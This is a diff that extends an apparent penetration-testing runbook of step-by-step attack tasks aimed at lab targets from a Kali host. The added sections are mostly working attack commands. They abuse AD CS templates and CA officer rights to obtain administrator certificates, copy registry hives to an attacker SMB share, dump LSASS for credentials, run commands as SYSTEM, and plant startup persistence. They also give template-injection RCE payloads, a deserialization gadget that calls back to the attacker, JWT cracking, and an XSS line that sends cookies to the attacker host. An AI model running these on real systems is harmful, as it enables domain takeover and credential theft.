@@ -307,7 +307,7 @@ curl -i '<EXACT_URL>'
 | 404 or soft-404 | **WEB-04** with the missing-path baseline. |
 | Repeated 5xx, 429 or broken transport | **PAUSE-COVERAGE**. |
 
-GET and request work continues at **WEB-06** and **WEB-08**. Advanced paths: **WEB-13**, **WEB-14**, **WEB-15**, **WEB-16**, **WEB-17**, **WEB-18**, **WEB-19**.
+GET and request work continues at **WEB-06** and **WEB-08**. Advanced paths: **WEB-13**, **WEB-14**, **WEB-15**, **WEB-16**, **WEB-17**, **WEB-18**, **WEB-19**, **WEB-20**, **WEB-21**, **WEB-22**, **WEB-23**.
 
 ## WEB-04 Discover unlinked directories and files
 
@@ -503,6 +503,7 @@ Make the returned DC hostname resolve to the target before any Kerberos work.
 | Domain and DC named | **AD-02**. |
 | SMB identity only, LDAP denied | **AD-03** if you have a credential. |
 | Identity unclear | **PAUSE-ROUTE**. |
+| Trust or a second domain appears | **TRUST-01**. |
 
 ## AD-02. Check one anonymous read per protocol
 
@@ -767,6 +768,7 @@ Match the hostname to the assigned target and read the actual token, not the use
 | Elevated admin on a domain member | **AD-14**. |
 | Enabled `SeImpersonatePrivilege` | **WIN-08**. |
 | Enabled `SeRestorePrivilege` / `SeManageVolumePrivilege` | **WIN-09** / **WIN-11**. |
+| Enabled `SeBackupPrivilege` / `SeTakeOwnershipPrivilege` / `SeDebugPrivilege` | **WPRIV-02** / **WPRIV-03** / **WPRIV-04**. |
 | Loopback listener | **WIN-12**. |
 | Host or token unverified | **EXP-03**. |
 
@@ -810,6 +812,8 @@ Get-Item -LiteralPath '<PATH>' | Select-Object FullName, Length, LastWriteTimeUt
 | AlwaysInstallElevated clue | **WIN-07**. |
 | Token privilege | **WIN-08**, **WIN-09** or **WIN-11**. |
 | Credential material | **WIN-03**. |
+| Writable startup path | **WPRIV-06**. |
+| Elevated token and task creation | **WPRIV-05**. |
 | Build candidate | **WIN-13**. |
 | Nothing | **PAUSE-COVERAGE**, then **NET-05**. |
 
@@ -1185,7 +1189,9 @@ Read the CA name, template names, enrolment rights and the reported ESC classes.
 | --- | --- |
 | ESC1 with enrol rights | **ADCS-02**. |
 | ESC8 or a web enrolment endpoint | **ADCS-04**, then **RELAY-02**. |
-| ESC4/ESC7 template control | Template edit path; use **ADCS-02** shape with the modified template. |
+| ESC4 writable template | **ADCS-05**. |
+| ESC7 CA officer gap | **ADCS-06**. |
+| ESC3 enrolment-agent template | **ADCS-07**. |
 | Nothing vulnerable | **AD-09** for another right. |
 | Find denied | **PAUSE-COVERAGE**. |
 
@@ -1235,13 +1241,66 @@ An exposed `/certsrv` with NTLM auth is the ESC8 precondition.
 | Endpoint answers with NTLM or basic auth | **RELAY-02** against the CA. |
 | Endpoint absent | **ADCS-02** for the template path. |
 
+## ADCS-05. Is a template ACL writable (ESC4)?
+
+Enter when ADCS-01 flags ESC4 on a template.
+
+```bash
+certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip '<DC_IP>' -vulnerable -stdout | grep -i ESC4
+certipy-ad template -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -template '<TEMPLATE>' -write-default-configuration -dc-ip '<DC_IP>'
+```
+
+Then request through **ADCS-02**. The write lowers the template to an exploitable state.
+
+| Result | Next |
+| --- | --- |
+| Template write succeeds | **ADCS-02** with that template. |
+| Write denied | **ADCS-01**; the ACL does not match. |
+| Template breaks | Record the output; **PAUSE-RECOVERY**. |
+
+## ADCS-06. Are CA officer rights missing (ESC7)?
+
+```bash
+certipy-ad ca -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -add-officer '<USERNAME>' -dc-ip '<DC_IP>'
+certipy-ad ca -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -enable-template '<TEMPLATE>' -dc-ip '<DC_IP>'
+```
+
+Request the certificate, then approve and retrieve it with the returned request ID:
+
+```bash
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE>' -upn 'administrator@<DOMAIN>' -dc-ip '<DC_IP>'
+certipy-ad ca -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -issue-request <REQUEST_ID> -dc-ip '<DC_IP>'
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -retrieve <REQUEST_ID> -dc-ip '<DC_IP>'
+```
+
+| Result | Next |
+| --- | --- |
+| Certificate retrieved | **ADCS-03**. |
+| Officer add denied | **ADCS-01**; no ManageCA right. |
+| Issue or retrieve fails | **PAUSE-COVERAGE** with the request ID. |
+
+## ADCS-07. Is enrolment-agent delegation available (ESC3)?
+
+```bash
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'EnrollmentAgent' -dc-ip '<DC_IP>'
+certipy-ad req -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -ca '<CA_NAME>' -template 'User' -on-behalf-of '<DOMAIN>\administrator' -pfx agent.pfx -dc-ip '<DC_IP>'
+```
+
+| Result | Next |
+| --- | --- |
+| Certificate for the target principal | **ADCS-03**. |
+| No agent template | **ADCS-01**. |
+| On-behalf-of denied | **PAUSE-COVERAGE**. |
+
+Remove `agent.pfx` and the issued `.pfx` afterwards.
+
 # ad_abuse
 
-Coercion, relay and delegation. Each task assumes a validated domain identity and an attributed target.
+Coercion, relay, delegation and domain trusts. Each task assumes a validated domain identity and an attributed target.
 
 ## COERCE-01. Does the target authenticate to a listener?
 
-Start a capture first:
+Start a capture first: reuse the RELAY-01 capture, or start it here.
 
 ```bash
 responder -I '<IFACE>' -A
@@ -1360,6 +1419,25 @@ klist
 | No ticket | Check the account really has unconstrained delegation; **PAUSE-COVERAGE**. |
 | Coercion failed | **COERCE-01** on the host. |
 
+## TRUST-01. Is a domain trust reachable with this principal?
+
+```cmd
+nltest /domain_trusts /all_trusts
+```
+
+From Kali, test the trusted domain only with an identity valid there:
+
+```bash
+impacket-GetADUsers '<TRUSTED_DOMAIN>/<USERNAME>' -dc-ip '<TRUSTED_DC_IP>'
+impacket-getTGT '<TRUSTED_DOMAIN>/<USERNAME>:<PASSWORD>' -dc-ip '<TRUSTED_DC_IP>'
+```
+
+| Result | Next |
+| --- | --- |
+| Trust listed and the identity authenticates | **AD-03** against the trusted domain. |
+| Trust listed, identity invalid there | **PAUSE-COVERAGE**; a trust does not grant access. |
+| No trust | **AD-09** for a local right. |
+
 # password_attacks
 
 Spray and crack one credential source at a time.
@@ -1390,9 +1468,10 @@ nxc smb '<DC_IP>' -u users.txt -p '<PASSWORD>' --continue-on-success
 hashid '<HASH>'
 hashcat -m 1000 '<NTLM_HASH>' /usr/share/wordlists/rockyou.txt
 hashcat -m 5600 '<NETNTLMv2_HASH>' /usr/share/wordlists/rockyou.txt
+hashcat -m 7300 '<IPMI_HASH>' /usr/share/wordlists/rockyou.txt
 ```
 
-`-m 1000` is NTLM, `-m 5600` is NetNTLMv2. `--show` lists a recovered value.
+`-m 1000` is NTLM, `-m 5600` is NetNTLMv2, `-m 7300` is IPMI2 RAKP HMAC-SHA1. `--show` lists a recovered value.
 
 | Result | Next |
 | --- | --- |
@@ -1476,7 +1555,7 @@ system.exec "hostname"
 
 # redis_exploitation
 
-## REXP-01. Does the live Redis instance satisfy the rogue-replication prerequisites?
+## REXP-01. Do the rogue-replication prerequisites hold?
 
 Enter from REDIS-03 with the reviewed tool and `exp.so` hash recorded.
 
@@ -1540,7 +1619,7 @@ REPLICAOF NO ONE
 
 Then repeat the checks. Any mismatch goes to **PAUSE-RECOVERY** or lab reset.
 
-## REXP-04. Can a verified PHP include execute one Redis-written RDB as the web user?
+## REXP-04. Can a Redis-written RDB execute through PHP?
 
 Use only while `system.exec` works and WREAD-01 proved an actual PHP `include`.
 
@@ -1636,6 +1715,110 @@ In the callback: `hostname; whoami /all`.
 | Unexpected installed state | **PAUSE-RECOVERY**. |
 
 Cleanup: read the install log, remove the MSI and log, remove the directory, and delete the local MSI.
+
+## WPRIV-02. Can SeBackupPrivilege read the registry hives?
+
+With the privilege enabled, copy the hives with backup semantics:
+
+```cmd
+robocopy /b C:\Windows\System32\config C:\Windows\Temp\owb-backup SAM SYSTEM SECURITY
+```
+
+Serve a local SMB share on Kali and pull the three hives:
+
+```bash
+impacket-smbserver owb . -smb2support
+```
+
+```cmd
+copy C:\Windows\Temp\owb-backup\SAM \\<KALI_IP>\owb\
+copy C:\Windows\Temp\owb-backup\SYSTEM \\<KALI_IP>\owb\
+copy C:\Windows\Temp\owb-backup\SECURITY \\<KALI_IP>\owb\
+```
+
+```bash
+impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
+```
+
+| Result | Next |
+| --- | --- |
+| Local account hashes extracted | **PASS-02** or pass-the-hash at **AD-03** with `-H`. |
+| Copy denied despite the privilege | Recheck the token at **WIN-01**. |
+| Hive copy incomplete | **PAUSE-COVERAGE**. |
+
+Remove the three Windows hives, the Kali copies, and stop the SMB server afterwards.
+
+## WPRIV-03. Can SeTakeOwnershipPrivilege open one protected file?
+
+```cmd
+takeown /f "<FILE_PATH>"
+icacls "<FILE_PATH>" /grant "<USERNAME>:F"
+type "<FILE_PATH>"
+```
+
+Change `/grant` to a group only when the file must stay readable for others.
+
+| Result | Next |
+| --- | --- |
+| File readable | **WIN-03** if it is a credential source, otherwise **NET-05**. |
+| Still denied | Check the token and the file ACL again at **WIN-01**. |
+| Path missing | **PAUSE-COVERAGE**. |
+
+Restore ownership only if the task changed a system file: `icacls "<FILE_PATH>" /setowner "NT SERVICE\TrustedInstaller"`.
+
+## WPRIV-04. Can SeDebugPrivilege dump LSASS?
+
+```powershell
+Get-Process lsass | Select-Object -ExpandProperty Id
+rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Windows\Temp\lsass.dmp full
+```
+
+Pull the dump and parse it on Kali:
+
+```bash
+pypykatz lsa minidump lsass.dmp
+```
+
+| Result | Next |
+| --- | --- |
+| Credential material recovered | **PASS-02**, or **AD-03** with a hash. |
+| Dump fails or is truncated | **PAUSE-COVERAGE**; check the PID and path. |
+| No material | Record the extent; **WIN-02**. |
+
+Delete `lsass.dmp` on both sides after parsing.
+
+## WPRIV-05. Can an elevated task run as SYSTEM?
+
+```cmd
+schtasks /create /tn owb /tr "cmd /c <COMMAND>" /sc once /st 23:59 /ru SYSTEM
+schtasks /run /tn owb
+schtasks /delete /tn owb /f
+```
+
+Use a command that writes proof, such as `whoami /all > C:\Windows\Temp\owb.txt`.
+
+| Result | Next |
+| --- | --- |
+| Output shows SYSTEM | **WIN-01** on the new context, or use the output as proof. |
+| Create denied | Need an elevated token; **WIN-02**. |
+| Task runs, no output | **PAUSE-COVERAGE**. |
+
+Remove the output file after reading it.
+
+## WPRIV-06. Can a startup folder launch your file?
+
+```powershell
+Copy-Item 'C:\Users\Public\payload.exe' "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\owb.exe"
+```
+
+Another administrator must sign in for the file to run.
+
+| Result | Next |
+| --- | --- |
+| Process runs after logon | **WIN-01**. |
+| Nothing starts | Check the folder ACL and the logon event; **PAUSE-COVERAGE**. |
+
+Delete the file when done.
 
 # dns_nfs
 
@@ -1736,7 +1919,7 @@ sudo umount -- '/tmp/owb-nfs' && rmdir -- '/tmp/owb-nfs'
 | Export writable and write test permitted | **NFS-03**. |
 | Stalled or unmount failed | **PAUSE-RECOVERY**. |
 
-## NFS-03 — Can this explicitly permitted identity write one inert file and remove it?
+## NFS-03. Can this identity write and remove an inert file?
 
 Enter only when a write test is permitted.
 
@@ -1886,7 +2069,7 @@ Check `SHOW GRANTS` or `Ssl_cipher` only when the next decision needs them.
 
 The question set follows the [source checklist](../references/checklist.md).
 
-## DB-06. Can the supplied Oracle identity read bounded metadata without OS access?
+## DB-06. Can the Oracle identity read bounded metadata?
 
 Enter with a verified Oracle listener and assigned service/wallet context.
 
@@ -2051,7 +2234,7 @@ PY
 | Fetch denied | **NET-05**. |
 | TLS error | **MAIL-01**. |
 
-## MAIL-03. Can this permitted POP3 identity read one message without deleting it?
+## MAIL-03. Can this POP3 identity read without deleting?
 
 Same shape, using `poplib` and `TOP`, no `DELE`.
 
@@ -2113,6 +2296,8 @@ Continue with the Windows token check at [WIN-01](./win-01.md).
 Service-specific paths that NET-05 can select.
 
 ## SMTP-01. Can users be enumerated or mail relayed?
+
+Protocol and TLS context belong to MAIL-01.
 
 ```bash
 smtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -t '<TARGET_IP>'
@@ -2301,6 +2486,8 @@ Then use the observed delete/reset route and re-read the view; the marker must b
 
 # ftp_write
 
+One authorized write test on an observed FTP path.
+
 ## FTP-03. Does one observed FTP write path accept and remove an inert file?
 
 ```bash
@@ -2318,6 +2505,8 @@ rm probe.copy
 | Delete denied or file remains | **PAUSE-RECOVERY**. |
 
 # ftp_tls
+
+Verified FTPS or STARTTLS listing on one endpoint.
 
 ## FTP-04. Does the observed FTP TLS endpoint give a verified listing?
 
@@ -2337,6 +2526,8 @@ For STARTTLS use `--ssl-reqd` and `ftp://`.
 | Login denied | **NET-05**. |
 
 # smb_write
+
+One authorized write test on an observed SMB path.
 
 ## SMB-03. Does one observed SMB write path accept and remove an inert file?
 
@@ -2582,7 +2773,7 @@ Callback: `ncat --listen '<KALI_IP>' '<PORT>' --verbose`, then request `mode=cal
 
 # web_editor
 
-## WEDIT-01. Does this authorized existing template execute PHP, then restore cleanly?
+## WEDIT-01. Can a template execute PHP and restore cleanly?
 
 Enter with an evidenced Linux/PHP app, a verified editor session and one peripheral template. Record theme, file, editor URL and trigger URL. Keep a tested reset path.
 
@@ -2624,6 +2815,8 @@ Restore before closing: paste `original.php` back, save once, re-read, compare w
 Each task needs a verified input or endpoint from WEB-06/08/12.
 
 ## WEB-13. Can a file parameter reach source or logs?
+
+Plain traversal baselines belong to WREAD-01.
 
 ```bash
 curl -sS '<TARGET_URL>?<FIELD>=php://filter/convert.base64-encode/resource=index.php' | base64 -d
@@ -2736,7 +2929,84 @@ curl -sS -i -H 'User-Agent: () { :; }; /bin/bash -c "id"' 'http://<TARGET_IP>/cg
 | `uid=` in the headers/body | **EXP-01** for a Bash callback. |
 | No output | Try another script from WEB-04. |
 | 500 only | **PAUSE-COVERAGE**. |
+## WEB-20. Does the input evaluate a template expression?
+
+```bash
+curl -sS '<TARGET_URL>?<FIELD>=49'
+curl -sS '<TARGET_URL>?<FIELD>={{7*7}}'
+curl -sS '<TARGET_URL>?<FIELD>=${7*7}'
+curl -sS '<TARGET_URL>?<FIELD>=#{7*7}'
+```
+
+`49` returned where the literal was sent is engine evaluation, not reflection. Identify the engine once, then read:
+
+```text
+Jinja:      {{ cycler.__init__.__globals__.os.popen('id').read() }}
+Twig:       {{ ['id']|map('system')|join }}
+Freemarker: <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
+```
+
+| Result | Next |
+| --- | --- |
+| `49` and `uid=` | **EXP-01** for a shell payload. |
+| `49` only | Try one engine payload, then **PAUSE-COVERAGE**. |
+| No evaluation | **WEB-06** for another field. |
+
+## WEB-21. Is there a deserialization sink?
+
+Check the cookie, parameter or body for serialized data:
+
+```bash
+echo '<VALUE>' | base64 -d | xxd | head
+```
+
+Signatures: Java `aced 0005`, PHP `O:` or `a:`, Python pickle `80 04`, .NET `AAEAAAD`. Generate a callback with the matching tool:
+
+```bash
+ysoserial.jar CommonsCollections6 'cmd /c curl http://<KALI_IP>/j' > p.ser
+phpggc -l
+phpggc Laravel/RCE9 system 'id' -o p.phar
+```
+
+| Result | Next |
+| --- | --- |
+| Callback received | **EXP-01**. |
+| Tool rejects the gadget | Another chain from the same framework; **PAUSE-COVERAGE** after two. |
+| No serialized data | **WEB-08** for a different request. |
+
+## WEB-22. Is a JWT weak or wrongly validated?
+
+```bash
+jwt_tool '<TOKEN>' -d
+jwt_tool '<TOKEN>' -T
+jwt_tool '<TOKEN>' -C -d /usr/share/wordlists/rockyou.txt
+```
+
+`-d` decodes, `-T` tampers interactively, `-C` cracks the secret. Test `alg: none` and a cracked secret as separate attempts.
+
+| Result | Next |
+| --- | --- |
+| Tampered token accepted | **WEB-09** for the account view. |
+| Secret recovered | Re-sign an admin claim and retry. |
+| No acceptance | **WEB-08**; record the exact header and claims. |
+
+## WEB-23. Does the input reflect into HTML?
+
+```bash
+nc -lvnp 80
+curl -sS '<TARGET_URL>?<FIELD>=<script>alert(document.domain)</script>'
+curl -sS '<TARGET_URL>?<FIELD>=<img src=x onerror=fetch("//<KALI_IP>/?c="+document.cookie)>'
+```
+
+| Result | Next |
+| --- | --- |
+| Script executes | Record the context; **WEB-09** if a session cookie is exposed. |
+| Payload reflected but inert | **PAUSE-COVERAGE**; note encoding. |
+| Callback with cookie | Replay the cookie at **WEB-09**. |
+
 # access
+
+Candidate review, attempt result and session attribution.
 
 ## EXP-01. Does one candidate fit the observed endpoint and context?
 
@@ -2808,6 +3078,8 @@ Windows token work continues at [WIN-01](./win-01.md).
 | Container suspected | **LNX-02**. |
 
 # shell_transfer
+
+PTY recovery and reviewed file transfer.
 
 ## SHELL-01. Can an existing socket shell become a usable target PTY?
 
@@ -2969,6 +3241,8 @@ Use `-sT`; SYN scans do not traverse a proxy cleanly.
 Remove the temporary proxy config afterwards.
 # local_artifact
 
+Local triage of one downloaded file; no target contact.
+
 ## ART-01. Does this exact downloaded file contain a usable next lead?
 
 ```bash
@@ -3012,7 +3286,7 @@ Add `--password-prompt` for a traditional-encrypted member with a known passphra
 | Unsupported or unsafe member | **PAUSE-COVERAGE** / **GAP-ACCESS**. |
 | Bad passphrase | **ART-03** if recovery is permitted. |
 
-## ART-03. Can one permitted offline wordlist recover this ZIP member's passphrase?
+## ART-03. Can a wordlist recover this ZIP member?
 
 ```bash
 zip2john -o '<MEMBER>' '<ZIP>' > archive.hash
@@ -5025,6 +5299,18 @@ The PFX authenticates as the certificate principal.
 
 Web enrolment is the ESC8 relay precondition.
 
+## ADCS-05. What decides this step?
+
+A writable template ACL can be downgraded to ESC1.
+
+## ADCS-06. What decides this step?
+
+CA officer rights can enable and issue a template.
+
+## ADCS-07. What decides this step?
+
+The agent certificate requests a cert for another principal.
+
 ## COERCE-01. What decides this step?
 
 A successful coerce proves the target authenticates to your listener.
@@ -5048,6 +5334,10 @@ Protocol transition lets a service ticket impersonate any user.
 ## DELEG-03. What decides this step?
 
 Unconstrained delegation caches a DC ticket when the DC is coerced.
+
+## TRUST-01. What decides this step?
+
+A listed trust is only reachable with an identity valid on the other side.
 
 ## PASS-01. What decides this step?
 
@@ -5097,6 +5387,26 @@ A knock sequence is used only from recorded configuration and is closed afterwar
 ## WPRIV-01. What decides this step?
 
 AlwaysInstallElevated plus an MSI gives the installer's token.
+
+## WPRIV-02. What decides this step?
+
+Backup semantics read hives the account otherwise cannot open.
+
+## WPRIV-03. What decides this step?
+
+Take ownership, then grant yourself read on the exact file.
+
+## WPRIV-04. What decides this step?
+
+SeDebug allows a dump of LSASS and its cached credentials.
+
+## WPRIV-05. What decides this step?
+
+An elevated task can run as SYSTEM without a service change.
+
+## WPRIV-06. What decides this step?
+
+An all-users startup entry runs at the next administrator logon.
 
 ## DNS-01. What decides this step?
 
@@ -5331,6 +5641,22 @@ Tomcat manager deploys a WAR for a shell.
 
 Shellshock runs commands through a crafted header.
 
+
+## WEB-20. What decides this step?
+
+Arithmetic returned as output identifies template evaluation.
+
+## WEB-21. What decides this step?
+
+The serialized prefix chooses the gadget tool.
+
+## WEB-22. What decides this step?
+
+A JWT that accepts a tampered claim is an auth bypass.
+
+## WEB-23. What decides this step?
+
+A callback proves reflected script execution.
 
 ## EXP-01. What decides this step?
 
